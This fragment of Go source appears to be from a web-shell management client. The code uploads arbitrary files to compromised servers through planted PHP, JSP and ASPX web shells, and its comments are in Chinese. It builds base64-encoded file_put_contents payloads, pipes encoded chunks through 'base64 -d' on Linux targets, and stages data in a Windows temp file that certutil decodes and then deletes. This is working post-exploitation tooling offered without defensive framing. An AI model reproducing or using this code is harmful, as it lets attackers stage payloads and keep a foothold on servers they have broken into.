	if s.platform == "windows" {
		return s.writeFileCmd(ctx, path, data)
	}
	return s.writeFileSh(ctx, path, data)
}

func (s *HTTPShell) writeFilePHP(ctx context.Context, path string, data []byte) error {
	if len(data) == 0 {
		data = []byte{} // 显式建空文件
	}
	for off := 0; off < len(data) || (off == 0 && len(data) == 0); off += ChunkSize {
		end := off + ChunkSize
		if end > len(data) {
			end = len(data)
		}
		chunk := data[off:end]
		flag := "0"
		if off > 0 {
			flag = "FILE_APPEND"
		}
		m := newSentinel()
		payload := `echo "` + m.start + `";` +
			`$r=@file_put_contents(base64_decode("` + b64e([]byte(path)) + `"),` +
			`base64_decode("` + b64e(chunk) + `"),` + flag + `);` +
			`echo ($r===false?"WRITEFAIL":"WRITEOK");` +
			`echo "\n` + m.end + `";`
		raw, err := s.phpFileOp(ctx, payload, m, 90*time.Second)
		if err != nil {
			return err
		}
		if strings.Contains(raw, "WRITEFAIL") {
			return opError("write", "写入失败（目录不可写）: %s（第 %d 块）", path, off/ChunkSize+1)
		}
		if !strings.Contains(raw, "WRITEOK") {
			return opError("write", "写入确认异常：目标回显 %q", excerpt(raw, 200))
		}
		if len(data) == 0 || end >= len(data) {
			return nil
		}
	}
	return nil
}

// writeFileSh 是 JSP(linux）路径：分块 echo b64 | base64 -d >> 目标。
func (s *HTTPShell) writeFileSh(ctx context.Context, path string, data []byte) error {
	q := shellQuote(path)
	for off := 0; off < len(data) || (off == 0 && len(data) == 0); off += ChunkSize {
		end := off + ChunkSize
		if end > len(data) {
			end = len(data)
		}
		op := ">"
		if off > 0 {
			op = ">>"
		}
		_, _, err := s.execSh(ctx, "echo "+b64e(data[off:end])+" | base64 -d "+op+" "+q, 90*time.Second)
		if err != nil {
			return err
		}
		if len(data) == 0 || end >= len(data) {
			return nil
		}
	}
	return nil
}

// writeFileCmd 是 ASPX(windows）路径：无管道 base64，先把 b64 分块 append 到
// 临时文件，再 certutil -decode 一次成形，用完清理。
func (s *HTTPShell) writeFileCmd(ctx context.Context, path string, data []byte) error {
	var b [6]byte
	_, _ = rand.Read(b[:])
	tmp := "%TEMP%\\artex_" + hex.EncodeToString(b[:]) + ".b64"
	for off := 0; off < len(data) || (off == 0 && len(data) == 0); off += ChunkSize {
		end := off + ChunkSize
		if end > len(data) {
			end = len(data)
		}
		op := ">"
		if off > 0 {
			op = ">>"
		}
		if _, _, err := s.execCmd(ctx, "echo "+b64e(data[off:end])+" "+op+" "+tmp, 90*time.Second); err != nil {
			return err
		}
		if len(data) == 0 || end >= len(data) {
			break
		}
	}
	if _, _, err := s.execCmd(ctx, "certutil -decode -f "+tmp+" "+path+" &del /q "+tmp, 90*time.Second); err != nil {
		return opError("write", "certutil 解码落盘失败: %v", err)
	}
	return nil
}

// shellQuote 是 sh 单引号转义（路径）。
func shellQuote(p string) string {
	return "'" + strings.ReplaceAll(p, "'", `'\''`) + "'"
}
